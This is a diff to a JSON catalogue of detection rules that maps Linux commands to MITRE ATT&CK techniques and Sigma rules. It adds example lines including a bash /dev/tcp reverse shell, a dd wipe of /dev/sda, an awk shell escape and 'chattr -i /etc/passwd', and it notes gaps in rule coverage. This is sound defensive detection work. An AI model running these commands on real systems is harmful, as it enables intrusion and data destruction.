@@ -8,7 +8,7 @@
       "description": "System owner / current user discovery",
       "techniques": [{ "id": "T1033", "name": "System Owner/User Discovery" }],
       "telemetry": ["execve() of /usr/bin/whoami — auditd type=EXECVE/SYSCALL", "process creation event with parent shell"],
-      "detections": [{ "source": "Sigma", "rule": "Local system reconnaissance utility execution (proc_creation_lnx)", "confidence": "medium" }],
+      "detections": [{ "source": "Sigma", "rule": "System Owner or User Discovery - Linux (auditd)", "confidence": "medium" }],
       "noise": 45
     },
     {
@@ -17,7 +17,7 @@
       "description": "User and group identity discovery",
       "techniques": [{ "id": "T1033", "name": "System Owner/User Discovery" }],
       "telemetry": ["execve() of /usr/bin/id", "process creation event"],
-      "detections": [{ "source": "Sigma", "rule": "Local system reconnaissance utility execution (proc_creation_lnx)", "confidence": "medium" }],
+      "detections": [{ "source": "Sigma", "rule": "System Owner or User Discovery - Linux (auditd)", "confidence": "medium" }],
       "noise": 45
     },
     {
@@ -188,7 +188,6 @@
         { "id": "T1105", "name": "Ingress Tool Transfer" }
       ],
       "telemetry": ["shell process with network-client parent (curl/wget) in the process tree", "no file written to disk — memory-only execution"],
-      "detections": [{ "source": "Sigma", "rule": "Download piped to shell interpreter (proc_creation_lnx)", "confidence": "high" }],
       "noise": 80
     },
     {
@@ -200,7 +199,6 @@
         { "id": "T1105", "name": "Ingress Tool Transfer" }
       ],
       "telemetry": ["shell process with network-client parent in the process tree", "memory-only execution"],
-      "detections": [{ "source": "Sigma", "rule": "Download piped to shell interpreter (proc_creation_lnx)", "confidence": "high" }],
       "noise": 80
     },
     {
@@ -218,13 +216,14 @@
     {
       "id": "reverse-shell-devtcp",
       "match": { "line": { "contains": "/dev/tcp" } },
+      "example": "bash -i >& /dev/tcp/10.0.0.1/4444 0>&1",
       "description": "Bash /dev/tcp reverse shell — interactive C2 channel",
       "techniques": [
         { "id": "T1059.004", "name": "Command and Scripting Interpreter: Unix Shell" },
         { "id": "T1071", "name": "Application Layer Protocol" }
       ],
       "telemetry": ["bash execve() followed by connect() to attacker IP", "stdin/stdout/stderr duped to a socket fd"],
-      "detections": [{ "source": "Sigma", "rule": "Reverse shell via /dev/tcp redirection (proc_creation_lnx)", "confidence": "high" }],
+      "detections": [{ "source": "Sigma", "rule": "Suspicious Reverse Shell Command Line (linux); the rule matches known one-liners, not /dev/tcp in general", "confidence": "high" }],
       "noise": 82
     },
     {
@@ -283,7 +282,6 @@
       "description": "Enabling a systemd unit — service persistence",
       "techniques": [{ "id": "T1543.002", "name": "Create or Modify System Process: Systemd Service" }],
       "telemetry": ["execve() of systemctl enable", "create()/symlink of unit under /etc/systemd/system"],
-      "detections": [{ "source": "Sigma", "rule": "Systemd service persistence (proc_creation_lnx / file_event_lnx)", "confidence": "medium" }],
       "noise": 55
     },
     {
@@ -307,13 +305,14 @@
     {
       "id": "chattr-immutable",
       "match": { "program": "chattr" },
+      "example": "chattr -i /etc/passwd",
       "description": "Setting file attributes (e.g. immutable) — hide artifacts / resist removal",
       "techniques": [
         { "id": "T1222.002", "name": "File and Directory Permissions Modification: Linux and Mac" },
         { "id": "T1564", "name": "Hide Artifacts" }
       ],
       "telemetry": ["execve() of chattr", "ioctl(FS_IOC_SETFLAGS)"],
-      "detections": [{ "source": "Sigma", "rule": "chattr immutable/append attribute change (proc_creation_lnx)", "confidence": "medium" }],
+      "detections": [{ "source": "Sigma", "rule": "Remove Immutable File Attribute (proc_creation_lnx / auditd); setting +i, rather than clearing it, is uncovered", "confidence": "medium" }],
       "noise": 55
     },
     {
@@ -322,7 +321,7 @@
       "description": "Making a file executable — staging a dropped payload",
       "techniques": [{ "id": "T1222.002", "name": "File and Directory Permissions Modification: Linux and Mac" }],
       "telemetry": ["execve() of chmod", "chmod() syscall setting execute bit"],
-      "detections": [{ "source": "Sigma", "rule": "chmod +x on file in tmp/user dir (proc_creation_lnx)", "confidence": "low" }],
+      "detections": [{ "source": "Sigma", "rule": "File or Folder Permissions Change (auditd)", "confidence": "low" }],
       "noise": 40
     },
     {
@@ -337,10 +336,11 @@
     {
       "id": "tar-archive",
       "match": { "program": "tar" },
+      "example": "tar -czf /tmp/loot.tar.gz /home/svc",
       "description": "Archiving data — collection prior to exfiltration",
       "techniques": [{ "id": "T1560.001", "name": "Archive Collected Data: Archive via Utility" }],
       "telemetry": ["execve() of tar", "sequential read() across many files"],
-      "detections": [{ "source": "Sigma", "rule": "Bulk archive creation (proc_creation_lnx)", "confidence": "low" }],
+      "detections": [{ "source": "Sigma", "rule": "Data Compressed (auditd); an archive created without a `-c` flag is uncovered", "confidence": "low" }],
       "noise": 45
     },
     {
@@ -399,7 +399,7 @@
       "description": "Grepping the filesystem for passwords — credentials in files",
       "techniques": [{ "id": "T1552.001", "name": "Unsecured Credentials: Credentials In Files" }],
       "telemetry": ["execve() of grep with a credential keyword", "recursive read() across many files"],
-      "detections": [{ "source": "Sigma", "rule": "Credential keyword search (proc_creation_lnx)", "confidence": "medium" }],
+      "detections": [{ "source": "Sigma", "rule": "Credentials In Files - Linux (auditd)", "confidence": "medium" }],
       "noise": 55
     },
     {
@@ -441,10 +441,11 @@
     {
       "id": "tcpdump",
       "match": { "program": "tcpdump" },
+      "example": "tcpdump -c 100 -i eth0 -w /tmp/capture.pcap",
       "description": "Packet capture — network sniffing",
       "techniques": [{ "id": "T1040", "name": "Network Sniffing" }],
       "telemetry": ["execve() of tcpdump", "creation of an AF_PACKET raw socket (needs CAP_NET_RAW)"],
-      "detections": [{ "source": "Sigma", "rule": "Packet capture utility execution (proc_creation_lnx)", "confidence": "medium" }],
+      "detections": [{ "source": "Sigma", "rule": "Network Sniffing - Linux (auditd); the rule keys on `-c` and `-i` in fixed argument positions", "confidence": "medium" }],
       "noise": 60
     },
     {
@@ -485,7 +486,6 @@
       "description": "Loading a kernel module by name — potential rootkit / persistence",
       "techniques": [{ "id": "T1547.006", "name": "Boot or Logon Autostart Execution: Kernel Modules and Extensions" }],
       "telemetry": ["execve() of modprobe", "finit_module() syscall"],
-      "detections": [{ "source": "Sigma", "rule": "Kernel module load via modprobe (proc_creation_lnx)", "confidence": "medium" }],
       "noise": 55
     },
     {
@@ -494,16 +494,16 @@
       "description": "Writing /etc/ld.so.preload — dynamic linker hijacking (userland rootkit)",
       "techniques": [{ "id": "T1574.006", "name": "Hijack Execution Flow: Dynamic Linker Hijacking" }],
       "telemetry": ["create()/write() of /etc/ld.so.preload — high-signal auditd file watch"],
-      "detections": [{ "source": "Sigma", "rule": "ld.so.preload modification (file_event_lnx)", "confidence": "high" }],
+      "detections": [{ "source": "Sigma", "rule": "Modification of ld.so.preload (auditd)", "confidence": "high" }],
       "noise": 80
     },
     {
       "id": "shell-profile-persist",
-      "match": { "line": { "contains": ".bashrc" }, "event": { "class": "file", "field": "TargetFilename", "suffix": "/.bashrc" } },
+      "match": { "line": { "contains": ".bashrc" }, "event": { "class": "file", "any": [{ "field": "TargetFilename", "eq": "/root/.bashrc" }, { "field": "TargetFilename", "suffix": "/.bashrc" }] } },
       "description": "Modifying a shell rc file (.bashrc) — logon persistence",
       "techniques": [{ "id": "T1546.004", "name": "Event Triggered Execution: Unix Shell Configuration Modification" }],
       "telemetry": ["write()/append to ~/.bashrc — auditd file watch"],
-      "detections": [{ "source": "Sigma", "rule": "Shell rc file modification (file_event_lnx)", "confidence": "medium" }],
+      "detections": [{ "source": "Sigma", "rule": "Unix Shell Configuration Modification (auditd)", "confidence": "medium" }],
       "noise": 55
     },
     {
@@ -602,13 +602,14 @@
     {
       "id": "capabilities-enum",
       "match": { "program": "getcap" },
+      "example": "getcap -r /",
       "description": "Enumerating file capabilities — privilege-escalation recon",
       "techniques": [
         { "id": "T1083", "name": "File and Directory Discovery" },
         { "id": "T1548.001", "name": "Abuse Elevation Control Mechanism: Setuid and Setgid" }
       ],
       "telemetry": ["execve() of getcap", "recursive getxattr() for security.capability"],
-      "detections": [{ "source": "Sigma", "rule": "Capabilities enumeration via getcap (proc_creation_lnx)", "confidence": "medium" }],
+      "detections": [{ "source": "Sigma", "rule": "Capabilities Discovery - Linux (proc_creation_lnx) / Linux Capabilities Discovery (auditd); a getcap run without `-r /` is uncovered", "confidence": "medium" }],
       "noise": 45
     },
     {
@@ -688,7 +689,7 @@
       "description": "Copying a reference file's timestamps with touch — timestomping",
       "techniques": [{ "id": "T1070.006", "name": "Indicator Removal: Timestomp" }],
       "telemetry": ["utimensat()/utimes() setting a file's times to match a reference", "execve() of touch with -r"],
-      "detections": [{ "source": "Sigma", "rule": "Timestomping via touch (proc_creation_lnx)", "confidence": "medium" }],
+      "detections": [{ "source": "Sigma", "rule": "File Time Attribute Change - Linux (auditd)", "confidence": "medium" }],
       "noise": 45
     },
     {
@@ -769,25 +770,25 @@
       "description": "Spawning a shell via find -exec — SUID/restricted-shell escape (GTFOBins)",
       "techniques": [{ "id": "T1548.001", "name": "Abuse Elevation Control Mechanism: Setuid and Setgid" }, { "id": "T1059.004", "name": "Command and Scripting Interpreter: Unix Shell" }],
       "telemetry": ["execve() of find spawning a shell through -exec", "child /bin/sh inheriting the parent's (possibly SUID) privileges"],
-      "detections": [{ "source": "Sigma", "rule": "Shell spawned via find -exec (proc_creation_lnx)", "confidence": "high" }],
       "noise": 55
     },
     {
       "id": "awk-system-exec",
-      "match": { "line": { "contains": "begin{system" } },
+      "match": { "line": { "any": [{ "contains": "begin{system" }, { "contains": "begin {system" }] } },
+      "example": "awk 'BEGIN {system(\"/bin/sh\")}'",
       "description": "Command execution via awk system() (GTFOBins)",
       "techniques": [{ "id": "T1059.004", "name": "Command and Scripting Interpreter: Unix Shell" }],
       "telemetry": ["execve() of awk invoking system() to run a command"],
-      "detections": [{ "source": "Sigma", "rule": "Command execution via awk system() (proc_creation_lnx)", "confidence": "medium" }],
       "noise": 55
     },
     {
       "id": "dd-wipe",
       "match": { "program": "dd", "args": { "contains": "of=/dev/" } },
+      "example": "dd if=/dev/zero of=/dev/sda bs=1M",
       "description": "Overwriting a block device with dd — data destruction",
       "techniques": [{ "id": "T1485", "name": "Data Destruction" }],
       "telemetry": ["execve() of dd writing to a raw block device (e.g. of=/dev/sda)", "large write() burst to a disk device"],
-      "detections": [{ "source": "Sigma", "rule": "Disk overwrite via dd (proc_creation_lnx)", "confidence": "high" }],
+      "detections": [{ "source": "Sigma", "rule": "Overwriting the File with Dev Zero or Null (auditd); an overwrite with no if= source is uncovered", "confidence": "high" }],
       "noise": 65
     }
   ]
